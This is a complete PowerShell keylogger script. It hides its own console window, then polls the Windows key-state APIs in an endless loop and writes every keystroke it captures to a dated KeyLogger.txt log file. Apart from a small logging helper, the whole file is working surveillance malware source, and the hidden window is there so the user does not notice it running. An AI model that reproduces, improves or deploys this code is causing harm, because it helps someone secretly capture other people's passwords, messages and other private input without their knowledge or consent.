




Add-Type -AssemblyName System.Windows.Forms
Add-Type -Name ConsoleUtils -Namespace WPIA -MemberDefinition @'
   [DllImport("Kernel32.dll")]
   public static extern IntPtr GetConsoleWindow();
   [DllImport("user32.dll")]
   public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
'@

# Hide Powershell window
$hWnd = [WPIA.ConsoleUtils]::GetConsoleWindow()
[WPIA.ConsoleUtils]::ShowWindow($hWnd, 0)


#region WriteLog function

function WriteLog($LogMessage, $LogDateTime, $LogType) 
{

	write-host 
	"$LogType, ["+ $LogDateTime +"]: "+ $LogMessage | Add-Content -Path $LogFilepath
}

#endregion

# Get Start Time
$startTime = (Get-Date)

$RunTime =get-date -Format "MMdyyyhhmmss"

# Get build folder parent directory
$scriptpath = $MyInvocation.MyCommand.Path
$ScriptDir = Split-Path $scriptpath


# Get Application folder path in the build folder

$LogFolderPath = $ScriptDir + "\" + "Logs" 


# Check if Log  folder already exists. If not create a folder for logging purposes 

if(!(Test-Path $LogFolderPath))
{
	New-Item -ItemType directory -Path $LogFolderPath 
}


[string] $logdate =get-date -Format "yyyyMMdd"


$LogFolderFilepath =$LogFolderPath + "\" + "$logdate" 

if(!(Test-Path $LogFolderFilepath))
{
	New-Item -ItemType directory -Path $LogFolderFilepath 
}


# creating logfile path string
$LogFilepath =$LogFolderFilepath +"\"+ "KeyLogger.txt"



$currentDate = (Get-Date).tostring(“dd-MM-yyyy”)


function Test-KeyLogger($logPath="$env:temp\test_keylogger.txt") 
{
  # API declaration
  $APIsignatures = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
public static extern short GetAsyncKeyState(int virtualKeyCode); 
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int GetKeyboardState(byte[] keystate);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int MapVirtualKey(uint uCode, int uMapType);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
'@
 $API = Add-Type -MemberDefinition $APIsignatures -Name 'Win32' -Namespace API -PassThru
    
  # output file
  $no_output = New-Item -Path $logPath -ItemType File -Force

  try
  {
    #Write-Host 'Keylogger started. Press CTRL+C to see results...' -ForegroundColor Red

    $LogDateTime = get-date
    WriteLog "**Keylogger started...."  $LogDateTime "Information"

    while ($true) {
      Start-Sleep -Milliseconds 40            
      for ($ascii = 9; $ascii -le 254; $ascii++) {
        # get key state
        $keystate = $API::GetAsyncKeyState($ascii)
        # if key pressed
        if ($keystate -eq -32767) {
          $null = [console]::CapsLock
          # translate code
          $virtualKey = $API::MapVirtualKey($ascii, 3)
          # get keyboard state and create stringbuilder
          $kbstate = New-Object Byte[] 256
          $checkkbstate = $API::GetKeyboardState($kbstate)
          $loggedchar = New-Object -TypeName System.Text.StringBuilder

          # translate virtual key          
          if ($API::ToUnicode($ascii, $virtualKey, $kbstate, $loggedchar, $loggedchar.Capacity, 0)) 
          {
            #if success, add key to logger file
            [System.IO.File]::AppendAllText($logPath, $loggedchar, [System.Text.Encoding]::Unicode) 
          }
        }
      }
    }
  }
  finally
  {  
  
   $LogDateTime = get-date
   WriteLog "**Keylogger Stopped. Open the Keylogger file to see results..."  $LogDateTime "Information"  
   exit

  }
}

Test-KeyLogger -logPath $LogFilepath